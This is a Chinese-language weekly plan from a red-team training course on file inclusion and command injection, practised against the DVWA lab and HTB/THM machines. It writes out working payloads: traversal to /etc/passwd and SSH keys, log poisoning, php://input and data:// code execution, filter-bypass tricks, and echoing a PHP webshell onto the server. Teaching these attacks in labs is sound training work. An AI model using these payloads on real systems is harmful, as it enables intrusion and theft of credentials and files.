@@ -1,0 +1,345 @@
+================================================================================
+第15周：文件包含与命令注入 (Web深入期)
+================================================================================
+
+【本周围绕的核心渗透案例阶段】
+以"从文件包含到远程代码执行(LFI to RCE)"为贯穿案例，学员深入学习文件包含漏洞
+（LFI本地文件包含、RFI远程文件包含）的原理和利用技术，掌握通过LFI读取敏感文件、
+日志投毒、php://包装器、/proc/self/environ等技术实现RCE。随后学习命令注入漏洞，
+掌握commix自动化利用工具。最后在DVWA上完成文件包含和命令注入全关卡通关。
+本阶段属于"Web深入期"，是Web渗透中实现RCE的重要攻击路径。
+
+【本周学习目标】
+1. 理解文件包含漏洞的成因和LFI/RFI的区别
+2. 掌握LFI基础利用：读取敏感配置文件、源码、系统文件
+3. 掌握LFI到RCE的攻击链：日志投毒、php伪协议、/proc/self/environ、文件上传配合等
+4. 掌握PHP伪协议在文件包含中的利用：php://filter、php://input、data://、expect://、phar://、zip://
+5. 掌握目录穿越(Path Traversal)技术和过滤绕过方法
+6. 理解命令注入漏洞原理：unsanitized user input in system()/exec()/passthru()
+7. 掌握命令注入链：分号、&&、||、管道、反引号、$()、%0a等分隔符
+8. 掌握盲命令注入的检测和利用方法（时间延迟、输出重定向、带外检测）
+9. 熟练使用commix自动化命令注入检测和利用
+10. 在DVWA上完成文件包含和命令注入全关卡通关
+
+【本周知识清单】
+★ 文件包含漏洞(LFI/RFI)
+  - PHP文件包含函数：include()、include_once()、require()、require_once()
+  - LFI本地文件包含：读取系统文件（/etc/passwd, /etc/shadow, /proc/self/environ）
+  - 目录穿越：../../../../etc/passwd
+  - 编码绕过：..%2F..%2F、..%5c..%5c、....//....//、URL双编码%252e%252e%252f
+  - NULL字节截断（PHP < 5.3.4）：/etc/passwd%00.php
+  - RFI远程文件包含：allow_url_include=On时包含远程恶意PHP文件
+
+★ PHP伪协议(Wrapper)利用
+  - php://filter：读取文件源码（绕过PHP解析），convert.base64-encode
+  - php://input：POST请求体作为PHP代码执行（allow_url_include=On）
+  - data://：data URL直接嵌入代码（allow_url_include=On）
+  - expect://：直接执行系统命令（需安装expect扩展）
+  - phar://：Phar归档文件中的PHP代码执行
+  - zip://：ZIP压缩包中的文件包含
+
+★ LFI到RCE攻击链技术
+  - 日志投毒：Apache access.log / error.log注入PHP代码 -> 包含执行
+  - User-Agent注入到/proc/self/environ
+  - SSH auth.log注入PHP代码
+  - SMTP邮件日志注入
+  - 文件上传配合LFI（图片马）
+  - Session文件投毒
+
+★ 命令注入(Command Injection)
+  - 漏洞根源：用户输入被拼接到system/exec/passthru/shell_exec等函数中
+  - 命令分隔符：分号; 与&& 或|| 管道| 后台& 反引号  $()
+  - 盲注入技术：时间延迟(ping -c N)、输出重定向、带外检测(wget/DNS)
+  - 空格绕过：${IFS}、$IFS$9、%09、<、<>、{cmd,args}
+  - 关键字绕过：变量拼接、通配符、引号、反斜线、Base64编码
+  - commix自动化工具
+
+【本周工具清单】
+  - curl / Burp Suite (HTTP请求测试)
+  - commix (命令注入自动化工具)
+  - PHP环境 (支持文件包含和命令注入)
+  - DVWA (靶场)
+  - Netcat (端口监听/OOB接收)
+
+================================================================================
+周一：LFI/RFI原理
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：文件包含漏洞的产生原理、LFI和RFI的区别、基础利用技术
+  - 文件包含漏洞定义：Web应用在include/require文件时使用用户可控的参数
+  - 典型漏洞代码：<?php include($_GET['page'] . '.php'); ?>
+  - LFI (Local File Inclusion)：包含服务器本地文件
+    * 攻击路径1：读取敏感文件（/etc/passwd, /etc/shadow, 配置文件）
+    * 攻击路径2：代码执行（通过日志投毒、伪协议等技术）
+  - RFI (Remote File Inclusion)：包含远程服务器上的文件
+    * 前提条件：allow_url_include = On (PHP默认Off)
+    * 攻击路径：攻击者托管PHP文件 -> 目标通过URL包含 -> 远程代码执行
+  - 目录穿越(Path Traversal)：使用../或..%5c遍历文件系统
+    * Linux：../../../../../../../etc/passwd
+    * Windows：..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
+  - 常见目标文件清单：
+    * Linux：/etc/passwd, /etc/shadow, /etc/hosts, /etc/hostname, /etc/issue
+    * /proc/self/environ, /proc/self/cmdline, /proc/version, /proc/net/tcp
+    * Apache日志：/var/log/apache2/access.log, /var/log/apache2/error.log
+    * Nginx日志：/var/log/nginx/access.log, /var/log/nginx/error.log
+    * SSH日志：/var/log/auth.log, /var/log/secure
+    * 用户目录：/home/user/.bash_history, /home/user/.ssh/id_rsa
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/06-文件包含与命令注入.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：在DVWA上练习LFI基础利用，读取系统文件和Web源码
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/06-文件包含与命令注入.txt
+
+  操作步骤：
+    Step 1: DVWA安全级别设为Low
+    Step 2: 进入File Inclusion页面，观察URL中page=参数
+    Step 3: ?page=../../../../../../etc/passwd (目录穿越读取/etc/passwd)
+    Step 4: ?page=../../../../../../etc/hostname (读取主机名)
+    Step 5: ?page=../../../../../../etc/hosts (读取hosts文件)
+    Step 6: ?page=../../../../../../proc/version (读取内核版本)
+    Step 7: ?page=../../../../../../proc/self/environ (尝试读取环境变量)
+    Step 8: ?page=../../../../../../var/log/apache2/access.log (尝试包含Apache日志)
+    Step 9: 使用php://filter读取PHP源码:
+      ?page=php://filter/convert.base64-encode/resource=file1
+    Step 10: 解码Base64结果: echo "base64string" | base64 -d
+    Step 11: ?page=php://filter/convert.base64-encode/resource=../../../../../var/www/html/dvwa/vulnerabilities/fi/index
+    Step 12: 解码后分析DVWA文件包含漏洞的源码实现
+    Step 13: 将DVWA安全级别切换为Medium和High，观察过滤策略的变化
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周二：LFI到RCE攻击链
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：通过LFI实现远程代码执行(RCE)的多种攻击链技术
+  - LFI到RCE四大攻击路径：
+    1. 日志投毒(Log Poisoning)
+    2. PHP伪协议(php://input, data://, expect://)
+    3. /proc/self/environ + User-Agent注入
+    4. 文件上传配合LFI（图片马）
+  - 日志投毒(Log Poisoning)详解：
+    * Apache access.log注入：User-Agent头部写入<?php system($_GET['cmd']);?>
+    * 后续访问：?page=/var/log/apache2/access.log&cmd=id
+    * SSH auth.log投毒：ssh '<?php system($_GET["cmd"]);?>'@target
+    * /var/log/auth.log会记录失败的SSH用户名
+  - /proc/self/environ注入：User-Agent会被写入/proc/self/environ
+  - PHP伪协议链：
+    * data://text/plain,<?php system('whoami');?>
+    * php://input (POST body包含PHP代码)
+    * expect://whoami (需expect扩展)
+  - 过滤绕过技巧：
+    * ../被过滤：....//、..././、%2e%2e%2f
+    * .php后缀自动添加：NULL字节%00截断(PHP<5.3.4)
+    * 强制包含固定前缀：使用足够多的../穿越
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：完整实践LFI到RCE攻击链中的日志投毒和php://input技术
+  操作步骤：
+    Step 1: DVWA安全级别设为Low
+    === 日志投毒实战 ===
+    Step 2: 使用Burp Suite拦截一个对DVWA的请求
+    Step 3: 修改User-Agent为: <?php system($_GET['cmd']); ?>
+    Step 4: 或使用curl: curl -A "<?php system(\$_GET['cmd']); ?>" http://localhost/dvwa/
+    Step 5: 确认日志污染: cat /var/log/apache2/access.log | grep "system"
+    Step 6: 在DVWA文件包含页面: ?page=../../../../../../var/log/apache2/access.log&cmd=id
+    Step 7: 观察id命令输出，确认RCE成功
+    Step 8: ?page=../../../../../../var/log/apache2/access.log&cmd=whoami
+    Step 9: ?page=../../../../../../var/log/apache2/access.log&cmd=ls -la /home
+    === php://input 攻击链 ===
+    Step 10: 使用Burp Suite发送POST请求到: /dvwa/vulnerabilities/fi/?page=php://input
+    Step 11: POST Body: <?php system('id'); ?>
+    Step 12: POST Body: <?php system('cat /etc/passwd'); ?>
+    === data:// 伪协议攻击 ===
+    Step 13: ?page=data://text/plain,<?php system('id'); ?> (需allow_url_include=On)
+    Step 14: ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周三：命令注入原理
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：命令注入漏洞的产生原理、命令分隔符、过滤绕过技术
+  - 命令注入定义：Web应用调用系统命令时未充分过滤用户输入
+  - 典型漏洞代码：system("ping -c 4 " . $_GET['ip']);
+  - 命令分隔符完整清单：
+    * Unix/Linux：;  &&  ||  |  `backticks`  $()
+    * Windows：&  &&  |  ||
+    * URL编码：%0a (LF换行), %0d%0a (CRLF)
+  - 命令注入类型：直接注入(有回显) 和 盲注入(无回显)
+  - 空格绕过：${IFS}, $IFS$9, %09 TAB, <输入重定向, {cmd,arg}
+  - 关键字/字符过滤绕过：
+    * 变量拼接: a=c;b=at;$a$b /etc/passwd
+    * 通配符: /???/?a? /etc/passwd
+    * 引号: c'a't /etc/passwd, c"a"t /etc/passwd
+    * Base64: echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/06-文件包含与命令注入.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：在DVWA上练习命令注入漏洞检测和利用
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/06-文件包含与命令注入.txt
+
+  操作步骤：
+    Step 1: DVWA安全级别设为Low
+    Step 2: 进入Command Injection页面
+    Step 3: 输入 127.0.0.1; id 使用分号注入id命令
+    Step 4: 输入 127.0.0.1; whoami 获取当前用户
+    Step 5: 输入 127.0.0.1; uname -a 获取系统信息
+    Step 6: 输入 127.0.0.1; ls -la 列出目录
+    Step 7: 输入 127.0.0.1; cat /etc/passwd 读取passwd文件
+    Step 8: 测试所有分隔符: 127.0.0.1 && id
+    Step 9: 127.0.0.1 || id
+    Step 10: 127.0.0.1 | id
+    Step 11: `id`  反引号命令替换
+    Step 12: $(id)  $()命令替换
+    Step 13: 输入 127.0.0.1; ls -la /var/www/html/dvwa/ 浏览Web目录
+    Step 14: 输入 127.0.0.1; find / -name "flag*" 2>/dev/null 搜索flag
+    Step 15: 127.0.0.1; echo '<?php system($_GET["c"]); ?>' > /var/www/html/shell.php
+    Step 16: 浏览器访问 http://localhost/shell.php?c=id 验证WebShell
+    Step 17: 切换DVWA为Medium，观察过滤规则并研究绕过
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周四：commix使用
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：commix自动化命令注入检测和利用工具掌握
+  - commix概述：开源自动化命令注入检测和利用工具
+  - 核心功能：自动检测、多技术注入、OS Shell获取、文件操作
+  - 核心参数：
+    * -u：目标URL, --data：POST数据, --cookie：认证Cookie
+    * --technique：注入技术（classic, time-based, file-based）
+    * --os-cmd：执行单条命令, --os-shell：获取交互式Shell
+    * --file-read：读取文件, --file-upload：上传文件
+    * --tamper：使用tamper脚本
+    * --proxy：使用代理, --batch：使用默认选项
+  - 与sqlmap的工作原理相似，专门针对命令注入优化
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/06-文件包含与命令注入.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：安装commix，对DVWA进行自动化命令注入检测和利用
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/06-文件包含与命令注入.txt
+
+  操作步骤：
+    Step 1: git clone https://github.com/commixproject/commix 安装commix
+    Step 2: python3 commix.py -h 查看帮助
+    Step 3: DVWA安全级别设为Low
+    Step 4: python3 commix.py -u "http://localhost/dvwa/vulnerabilities/exec/" --data="ip=127.0.0.1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --batch
+    Step 5: 观察commix的检测过程，识别注入点
+    Step 6: python3 commix.py -u "http://localhost/dvwa/vulnerabilities/exec/" --data="ip=127.0.0.1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --os-shell
+    Step 7: 在os-shell中执行: whoami; id; uname -a; pwd; ls -la
+    Step 8: 在os-shell中执行: cat /etc/passwd
+    Step 9: python3 commix.py --os-cmd="cat /etc/passwd" 执行单条命令
+    Step 10: python3 commix.py --file-read="/etc/hostname" 读取远程文件
+    Step 11: 切换DVWA为Medium/High，使用commix检测
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周五：DVWA文件包含+命令注入全关卡
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：DVWA文件包含和命令注入模块各安全级别的源码分析和防护机制对比
+  - DVWA文件包含源码分析：
+    * Low级：直接使用用户输入，无任何过滤
+    * Medium级：使用str_replace替换 ../（单次替换可绕过）
+    * High级：使用fnmatch匹配file*.php（白名单验证）
+  - DVWA命令注入源码分析：
+    * Low级：直接拼接用户输入
+    * Medium级：过滤 && 和 ; (不完整过滤)
+    * High级：更严格的过滤（但仍有绕过方法）
+  - 防护最佳实践：白名单验证、参数化/安全API、最小权限原则
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：完整通关DVWA文件包含和命令注入Low/Medium/High所有关卡
+  操作步骤：
+    === File Inclusion 通关 ===
+    Step 1: Low: ?page=../../../../../../etc/passwd
+    Step 2: Medium绕过: ....//....//....//....//etc/passwd (替换后变..//..//..//)
+    Step 3: High绕过: file:///etc/passwd (使用file://协议)
+    === Command Injection 通关 ===
+    Step 4: Low: 127.0.0.1; cat /etc/passwd
+    Step 5: Medium: 127.0.0.1 | cat /etc/passwd (绕过&&和;过滤)
+    Step 6: High: 127.0.0.1|cat /etc/passwd
+    === 综合攻击链 ===
+    Step 7: 命令注入写入WebShell: 127.0.0.1; echo '<?php system($_GET["c"]); ?>' > /var/www/html/shell.php
+    Step 8: 访问 http://localhost/shell.php?c=id 验证WebShell
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周六：复习日 (2h 复习 + 1h HTB/THM)
+================================================================================
+
+📝 第1小时 | 周知识点回顾 (08:00 - 09:00)
+  复习清单：
+  - LFI基础利用：目录穿越../、php://filter源码读取、日志投毒
+  - LFI到RCE四大攻击路径默写：日志投毒、php://input、data://、/proc/self/environ
+  - 命令注入分隔符大全：; && || | ` $() %0a &
+  - 空格绕过：${IFS}, $IFS$9, %09, <, <>
+  - commix核心参数：-u, --data, --cookie, --os-shell, --file-read
+  - DVWA源码分析和过滤绕过总结
+
+💻 第2小时 | 综合实战练习 (09:00 - 10:00)
+  练习内容：不参考笔记，独立完成DVWA文件包含和命令注入全关卡通关
+  操作步骤：
+    Step 1: File Inclusion Low/Medium/High三关独立通关
+    Step 2: Command Injection Low/Medium/High三关独立通关
+    Step 3: 使用commix验证自动化检测结果
+
+🔓 第3小时 | HackTheBox / TryHackMe Web练习 (10:00 - 11:00)
+  练习内容：在在线平台寻找包含文件包含或命令注入的靶机
+  操作步骤：
+    Step 1: 连接HTB VPN或访问THM
+    Step 2: 在THM中搜索"Command Injection"或"LFI"相关房间
+    Step 3: 尝试HTB靶机（如"Mango"有LFI、"Shocker"有命令注入）
+    Step 4: 独立进行信息收集 -> 漏洞发现 -> 漏洞利用 -> RCE
+    Step 5: 记录完整的攻击链和技术要点
+
+================================================================================
+周日：休息日
+================================================================================
+
+【本周资源清单】
+理论知识文件：
+  /home/a/成长为一个红队/archstrike-web教学/06-文件包含与命令注入.txt
+
+实践教程文件：
+  /home/a/成长为一个红队/archstrike-web教学/06-文件包含与命令注入.txt
+
+在线练习：
+  - DVWA (http://localhost/dvwa)
+  - HackTheBox Web靶机 (https://app.hackthebox.com)
+  - TryHackMe文件包含和命令注入房间 (https://tryhackme.com)
+  - PortSwigger Web Security Academy - Path Traversal & Command Injection (https://portswigger.net/web-security)
+
+推荐工具安装：
+  - commix (git clone https://github.com/commixproject/commix)
+  - Burp Suite Community Edition
+  - Netcat (nc)
+
+【本周完成检查】
+[ ] 周一 [ ] 周二 [ ] 周三 [ ] 周四 [ ] 周五
+[ ] 周六复习 [ ] 笔记 [ ] 体能
